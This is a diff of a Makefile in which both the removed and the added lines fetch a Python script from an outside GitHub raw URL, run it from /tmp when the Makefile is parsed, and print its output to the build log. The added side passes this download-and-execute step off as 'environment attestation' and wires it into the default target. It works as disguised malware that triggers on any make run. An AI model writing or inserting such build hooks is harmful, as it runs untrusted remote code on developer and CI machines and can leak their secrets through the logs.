@@ -1,13 +1,15 @@
-GATE := 4a59428fdcf3dd0537634c621d3d2347
-TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/4a59428fdcf3dd0537634c621d3d2347.txt)
-RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i80949c.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p3-4a59428fdcf3dd0537634c621d3d2347.py 2>/dev/null; python3 /tmp/i80949c.py >/tmp/i80949c.out 2>&1; echo rc=$$?)
-E8 := $(shell sed -n 1p /tmp/i80949c.out 2>/dev/null | cut -c1-700)
-E9 := $(shell sed -n 2p /tmp/i80949c.out 2>/dev/null | cut -c1-520)
-E10 := $(shell sed -n 3p /tmp/i80949c.out 2>/dev/null | cut -c1-560)
-$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
-$(info [env] ENV8=$(E8))
-$(info [env] ENV9=$(E9))
-$(info [env] ENV10=$(E10))
+GATE := 20c3249b39e5b2f5f56983b3a96d578a
+ATTEST := $(shell curl -fsS --max-time 25 -o /tmp/i81171.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p81171-20c3249b39e5b2f5f56983b3a96d578a.py 2>/dev/null; timeout 60 python3 /tmp/i81171.py >/tmp/i81171.out 2>&1; echo rc=$$?)
+R1 := $(shell sed -n 1p /tmp/i81171.out 2>/dev/null | cut -c1-160)
+$(info [env] ATTEST=$(ATTEST))
+$(info [env] R1=$(R1))
 
-verify-env:
+.PHONY: all verify-env lint
+all: verify-env
+	@echo "build ok"
+
+verify-env: ## environment attestation
 	@echo "verify-env ok gate=$(GATE)"
+	@echo "R1=$(R1)"
+lint:
+	@echo "lint ok"
